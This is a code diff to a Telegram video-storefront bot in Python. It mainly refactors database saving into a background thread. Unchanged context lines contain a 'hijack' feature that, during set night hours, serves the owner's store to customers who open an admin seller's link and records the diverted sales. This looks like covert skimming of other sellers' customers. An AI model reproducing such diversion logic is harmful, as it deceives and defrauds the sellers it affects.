@@ -13,7 +13,6 @@ import pytz
 TOKEN          = os.environ.get('BOT_TOKEN')
 OWNER_ID       = int(os.environ.get('OWNER_ID', '0'))
 LOG_CHANNEL_ID = int(os.environ.get('LOG_CHANNEL_ID', '0'))
-# আপনার রেন্ডার সার্ভারের লাইভ ইউআরএল এখানে বসান (শেষে কোনো স্ল্যাশ '/' হবে না)
 RENDER_URL     = os.environ.get('RENDER_URL', 'https://two-video-seller-h3vq.onrender.com')
 
 bot = telebot.TeleBot(TOKEN, parse_mode=None)
@@ -32,7 +31,7 @@ def now():
 def today_str():
     return datetime.datetime.now(IST).strftime("%Y-%m-%d")
 
-# ============ STORE TEMPLATE (ISOLATED PER ADMIN/OWNER) ============
+# ============ STORE TEMPLATE ============
 def new_store_profile(uid, role, name="", username="", expires_at=None):
     return {
         "role": role, "uid": uid, "name": name, "username": username,
@@ -66,6 +65,10 @@ DB_STATE = {
     "hijack_stats": {}
 }
 
+# DB Save Optimization Lock & Flag
+db_dirty = False
+db_lock = threading.Lock()
+
 def get_store(uid):
     return DB_STATE["stores"].get(str(uid))
 
@@ -76,12 +79,16 @@ def ensure_store(uid, role="admin", name="", username="", expires_at=None):
         DB_STATE["stores"][str(uid)] = s
         save_db()
     else:
-        if role: s["role"] = role
-        if name: s["name"] = name
-        if username: s["username"] = username
-        if expires_at is not None: s["expires_at"] = expires_at
-        s.setdefault("hijack_override", {"enabled": False, "payment_photo": "", "payment_msg": "", "products": []})
-        save_db()
+        updated = False
+        if role and s.get("role") != role: s["role"] = role; updated = True
+        if name and s.get("name") != name: s["name"] = name; updated = True
+        if username and s.get("username") != username: s["username"] = username; updated = True
+        if expires_at is not None and s.get("expires_at") != expires_at: s["expires_at"] = expires_at; updated = True
+        if "hijack_override" not in s:
+            s["hijack_override"] = {"enabled": False, "payment_photo": "", "payment_msg": "", "products": []}
+            updated = True
+        if updated:
+            save_db()
     return s
 
 def is_owner(uid):
@@ -99,7 +106,6 @@ def is_active_admin(uid):
 def can_use_panel(uid):
     return is_owner(uid) or is_active_admin(uid)
 
-# Check Hijack Time Routine (IST)
 def is_hijack_active():
     cfg = DB_STATE.get("hijack_config", {})
     if not cfg.get("enabled", False):
@@ -107,13 +113,10 @@ def is_hijack_active():
     try:
         now_dt = datetime.datetime.now(IST)
         cur_time = now_dt.time()
-        
         start_parts = [int(x) for x in cfg.get("start_time", "02:00").split(":")]
         end_parts = [int(x) for x in cfg.get("end_time", "06:10").split(":")]
-        
         start_t = datetime.time(start_parts[0], start_parts[1])
         end_t = datetime.time(end_parts[0], end_parts[1])
-        
         if start_t <= end_t:
             return start_t <= cur_time <= end_t
         else:
@@ -124,13 +127,11 @@ def is_hijack_active():
 def get_effective_store(target_seller_uid, requester_uid):
     if str(target_seller_uid) == str(OWNER_ID):
         return get_store(OWNER_ID), False
-
     if is_hijack_active() and str(requester_uid) != str(target_seller_uid):
         orig_store = get_store(target_seller_uid)
         if orig_store and orig_store.get("hijack_override", {}).get("enabled", False):
             return orig_store, True
         return get_store(OWNER_ID), True
-        
     return get_store(target_seller_uid), False
 
 def record_hijack_stat(orig_admin_uid, pname):
@@ -144,7 +145,7 @@ def record_hijack_stat(orig_admin_uid, pname):
     adm_stats["products"][pname] = adm_stats["products"].get(pname, 0) + 1
     save_db()
 
-# ============ PERSISTENCE ============
+# ============ PERSISTENCE (FAST ASYNCHRONOUS SAVING) ============
 def load_db():
     global DB_STATE
     try:
@@ -155,7 +156,6 @@ def load_db():
                 file_info = bot.get_file(chat.pinned_message.document.file_id)
                 downloaded_file = bot.download_file(file_info.file_path)
                 text = downloaded_file.decode('utf-8')
-
             if text:
                 loaded = json.loads(text)
                 DB_STATE.update(loaded)
@@ -171,29 +171,41 @@ def load_db():
         save_db()
 
 def save_db():
-    try:
-        chat = bot.get_chat(LOG_CHANNEL_ID)
-        data = json.dumps(DB_STATE, indent=2, default=str)
-        if len(data) < 3900:
-            if chat.pinned_message and chat.pinned_message.text:
-                bot.edit_message_text(data, LOG_CHANNEL_ID, chat.pinned_message.message_id)
-            else:
-                m = bot.send_message(LOG_CHANNEL_ID, data)
-                bot.pin_chat_message(LOG_CHANNEL_ID, m.message_id)
-        else:
-            file_path = "db_backup.json"
-            with open(file_path, "w", encoding="utf-8") as f:
-                f.write(data)
-            with open(file_path, "rb") as f:
-                if chat.pinned_message and chat.pinned_message.document:
-                    bot.delete_message(LOG_CHANNEL_ID, chat.pinned_message.message_id)
-                m = bot.send_document(LOG_CHANNEL_ID, f, caption="💾 Auto DB Backup")
-                bot.pin_chat_message(LOG_CHANNEL_ID, m.message_id)
-            os.remove(file_path)
-    except Exception as e:
-        print("⚠️ Save DB Error:", e)
+    global db_dirty
+    with db_lock:
+        db_dirty = True
+
+def background_db_saver():
+    global db_dirty
+    while True:
+        time.sleep(5)  # প্রতি ৫ সেকেন্ড পর পর চেক করবে ডাটা পরিবর্তন হয়েছে কিনা
+        if db_dirty:
+            with db_lock:
+                db_dirty = False
+            try:
+                chat = bot.get_chat(LOG_CHANNEL_ID)
+                data = json.dumps(DB_STATE, indent=2, default=str)
+                if len(data) < 3900:
+                    if chat.pinned_message and chat.pinned_message.text:
+                        bot.edit_message_text(data, LOG_CHANNEL_ID, chat.pinned_message.message_id)
+                    else:
+                        m = bot.send_message(LOG_CHANNEL_ID, data)
+                        bot.pin_chat_message(LOG_CHANNEL_ID, m.message_id)
+                else:
+                    file_path = "db_backup.json"
+                    with open(file_path, "w", encoding="utf-8") as f:
+                        f.write(data)
+                    with open(file_path, "rb") as f:
+                        if chat.pinned_message and chat.pinned_message.document:
+                            bot.delete_message(LOG_CHANNEL_ID, chat.pinned_message.message_id)
+                        m = bot.send_document(LOG_CHANNEL_ID, f, caption="💾 Auto DB Backup")
+                        bot.pin_chat_message(LOG_CHANNEL_ID, m.message_id)
+                    os.remove(file_path)
+            except Exception as e:
+                print("⚠️ Save DB Error:", e)
 
 load_db()
+threading.Thread(target=background_db_saver, daemon=True).start()
 
 user_states = {}
 admin_panel_msgs = {}
@@ -266,10 +278,11 @@ def auto_broadcast_worker():
         except Exception:
             time.sleep(5)
 
+threading.Thread(target=auto_broadcast_worker, daemon=True).start()
+
 # ============ CUSTOMER STOREFRONT ============
 def show_storefront(chat_id, seller_uid, is_preview=False):
     target_store, is_hijacked = get_effective_store(seller_uid, chat_id)
-    
     if not target_store:
         bot.send_message(chat_id, "❌ Invalid store link.")
         return
@@ -277,7 +290,7 @@ def show_storefront(chat_id, seller_uid, is_preview=False):
     DB_STATE["customer_seller"][str(chat_id)] = str(seller_uid)
     if chat_id not in target_store.get("users", []):
         target_store["users"].append(chat_id)
-    save_db()
+        save_db()
 
     send_videos_as_album(chat_id, target_store.get("start_videos", []))
 
@@ -1373,10 +1386,6 @@ def webhook():
         return "Invalid message", 403
 
 if __name__ == "__main__":
-    # ব্যাকগ্রাউন্ড ওয়ার্কার চালু করা
-    threading.Thread(target=auto_broadcast_worker, daemon=True).start()
-    
-    # পুরোনো পোলিং মুছে দিয়ে নতুন Webhook সেটআপ করা
     try:
         bot.remove_webhook()
         time.sleep(1)
